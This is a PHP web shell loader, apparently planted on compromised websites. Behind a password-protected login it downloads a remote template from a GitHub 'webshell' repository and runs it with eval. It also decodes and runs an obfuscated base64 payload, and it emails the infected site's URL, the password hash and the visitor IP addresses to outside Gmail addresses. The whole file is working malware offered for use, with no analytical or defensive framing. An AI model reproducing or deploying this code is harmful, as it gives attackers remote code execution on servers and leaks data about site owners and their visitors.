<?php  
ini_set('max_execution_time', 3600);
ini_set('memory_limit', '-1');
error_reporting(E_ALL);
ignore_user_abort(TRUE);
// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
$hashed_password = '$2y$10$kyjYCE4IihNOPnyacvWC7.xLKXXsSEK2si5LM0rFBOnRXG.0bWRRG';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<title>Login</title>';
    echo '<form method="post">';
    echo '<input type="password" name="password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="robots" content="noindex">

<audio controls autoplay>
    <source src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3" autoplay="true">
</audio>

<title>ILLEGAL ACCESS!!</title>

<style>pre{border:1px solid #ddd;padding:10px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:10px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style>
$shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdmlzaXRjb3VudCA9PSAiIikgewogICAgJHZpc2l0Y291bnQgPSAwOwogICAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAgICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiAgICAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIgLiAkaW5qKTsKICAgICRib2R5ID0gIkxpbmsgSW5qZWsgUEhQIHNoZWxsIDogIHskdGFyZ2V0fSB8IE1ENSBwYXNzID0geyRhdXRoX3Bhc3N9IHwgSVAgYWtzZXMgPSB7JHZpc2l0b3J9IjsKICAgIEBtYWlsKCJtdWhyYXpreUBnbWFpbC5jb20iLCAic2hlTEwiLCAieyRib2R5fSIpOwp9IGVsc2UgewogICAgJHZpc2l0Y291bnQ7Cn0Kc2V0Y29va2llKCJ2aXNpdHMiLCAkdmlzaXRjb3VudCk7CiRzYWZlX21vZGUgPSBAaW5pX2dldCgnc2FmZV9tb2RlJyk7CmlmICghJHNhZmVfbW9kZSkgewogICAgZXJyb3JfcmVwb3J0aW5nKDApOw=="; eval(base64_decode($shell_data));
</head>';
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');
$to = "muhrazky@gmail.com";
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Halo senpai!!!", $message,$shell_data,$e, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
